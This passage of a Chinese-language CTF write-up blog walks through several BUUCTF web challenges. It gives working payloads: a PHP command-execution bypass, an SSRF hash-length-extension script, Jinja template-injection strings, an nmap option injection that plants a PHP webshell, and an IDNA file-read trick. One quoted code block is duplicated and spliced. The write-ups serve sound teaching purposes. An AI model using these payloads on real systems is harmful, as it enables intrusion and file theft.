<code>$GET[a]($GET[b])&amp;a=system&amp;b=ls</code> &#x3D;&gt; <code>$GET&#123;a&#125;($GET&#123;b&#125;)</code></p><p>最后payload</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">c=<span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>&#123;<span class="hljs-built_in">pi</span>&#125;(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br></code></pre></td></tr></table></figure><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>参考链接：<a href="https://xz.aliyun.com/t/5927#toc-1">https://xz.aliyun.com/t/5927#toc-1</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br> <br>app = Flask(__name__)<br> <br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):</span>  <span class="hljs-comment">#注册函数</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            os.mkdir(self.sandbox)<br> <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span>(<span class="hljs-params">self</span>):</span><br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):      <span class="hljs-comment">#scan打开自己沙盒的result.txt</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp   <span class="hljs-comment">#输出自己的参数</span><br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br> <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))  <span class="hljs-comment">#action=&#x27;scan&#x27;</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br> <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">param</span>):</span><br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span>(<span class="hljs-params">action, param</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">content</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">param</span>):</span><br>    check=param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">9999</span>)<br></code></pre></td></tr></table></figure><p>说说自己的想法，getSign的地方 param 可控我们势必要在载荷的地方做出改变 所以大概能想到传参 flag.txtread</p><div class="code-wrapper"><pre><code class="hljs">但是这个思路不太完善，看了看别人的wp。有一个点我觉得不错，在于line 31,41的if判断这里对于action的判断是 in 而非 == 也可以想到这里可以有多个action传参。接下来去 /geneSign 搞定我们的md5 这样拼接之后就是 md5(keyflag.txtreadscan)，Exec内对于read的处理方法就可以执行</code></pre></div><p>最后有</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/De1ta?param=flag.txt</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>26a26904-6f92-425f-a018-445997ee6c01.node4.buuoj.cn:81<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>action=readscan;sign=e0da2a0335f2dc4ce71357fdd470fbfb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br></code></pre></td></tr></table></figure><h3 id="哈希长度拓展攻击"><a href="#哈希长度拓展攻击" class="headerlink" title="哈希长度拓展攻击"></a>哈希长度拓展攻击</h3><p>需要知道key的长度</p><p>先在&#x2F;geneSign 传?param&#x3D;file.txt 得到 f112f06e5871b5f22708f07a3549f3d1</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201161208704.png" alt="image-20220116120756414"></p><p>最后有脚本 记得把 \x 替换为 %</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://26a26904-6f92-425f-a018-445997ee6c01.node4.buuoj.cn:81/De1ta?param=flag.txt&#x27;</span><br><br>cookies = &#123;<br>  <span class="hljs-string">&#x27;sign&#x27;</span>: <span class="hljs-string">&#x27;7c63b1256d62b878e5bb9ffb758006a8&#x27;</span>,<br>  <span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&#x27;</span>,<br>  &#125;<br><br>res = requests.get(url=url, cookies=cookies)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os <br>app = flask.Flask(__name__) <br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span> <br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>) </span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shrine</span>(<span class="hljs-params">shrine</span>):</span> <br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">safe_jinja</span>(<span class="hljs-params">s</span>):</span> <br>    s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <br>    blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<br><span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine)) <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>  app.run(debug = <span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>可以看到有一个flag的环境变量，如果没有过滤可以直接通过  {undefined{config}} 查看appconfig的内容</p><p>但是这个题目过滤了config，这个payload无法使用，但是我们还有  <code>url_for</code> 和  <code>get_flashed_messages</code></p><p>可以使用</p><p>最终payload</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="xml"></span><br><span class="xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>感觉就像是 Online Tool的样子，按照那题的思路打 ‘content ‘</p><p>实践中发现php被过滤 替换为 phtml 这题考察的nmap -oN参数的使用</p><p>构建</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27; &lt;?=`nl /*`;?&gt; -oG 1.phtml &#x27;<br></code></pre></td></tr></table></figure><p>即可</p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>???环境问题？没搞出来    </p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>访问flag.php xff 127.0.0.1得flag</p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>buu经典需要整理代码在做题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) def getUrl(): url = request.args.get(<span class="hljs-params"><span class="hljs-string">&quot;url&quot;</span></span>) host = parse.urlparse(<span class="hljs-params">url</span>).hostname if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: return <span class="hljs-string">&quot;我扌 your problem? 111&quot;</span> parts = list(<span class="hljs-params">urlsplit(<span class="hljs-params">url</span>)</span>) host = parts[<span class="hljs-number">1</span>] if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>: return <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host newhost = [] for h in host.split(<span class="hljs-params"><span class="hljs-string">&#x27;.&#x27;</span></span>): newhost.append(<span class="hljs-params">h.encode(<span class="hljs-params"><span class="hljs-string">&#x27;idna&#x27;</span></span>).decode(<span class="hljs-params"><span class="hljs-string">&#x27;utf-8&#x27;</span></span>)</span>) parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(<span class="hljs-params">newhost</span>) </span><span class="hljs-comment">#去掉 url 中的空格 finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot;@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your pr@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot;oblem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot;</span><br></code></pre></td></tr></table></figure><p>可以看到是一个依次对url进行解析的过程</p><p>这其中使用idna编码</p><p>有一个链接：<a href="https://bugs.python.org/issue36216">https://bugs.python.org/issue36216</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>u = <span class="hljs-string">&quot;https://example.com\uFF03@bing.com&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>urlsplit(u).netloc.rpartition(<span class="hljs-string">&quot;@&quot;</span>)[<span class="hljs-number">2</span>]<br>bing.com<br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-comment"># Simulate</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>u = <span class="hljs-string">&quot;https://example.com\uFF03@bing.com&quot;</span>.encode(<span class="hljs-string">&quot;idna&quot;</span>).decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>urlsplit(u).netloc.rpartition(<span class="hljs-string">&quot;@&quot;</span>)[<span class="hljs-number">2</span>]<br>example.com<br></code></pre></td></tr></table></figure><p>发现字符  ℆  可以替换c&#x2F;u ，联想到这题要我们读nginx</p><p>有</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">getUrl?url=file:<span class="hljs-regexp">//</span>suctf.cℭ<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br>告诉我们 flag在 <span class="hljs-regexp">/usr/</span>flag<br>getUrl?url=file:<span class="hljs-regexp">//</span>suctf.cℭ<span class="hljs-regexp">/usr/</span>fffffflag<br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//WTF IS THIS?</span><br><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span 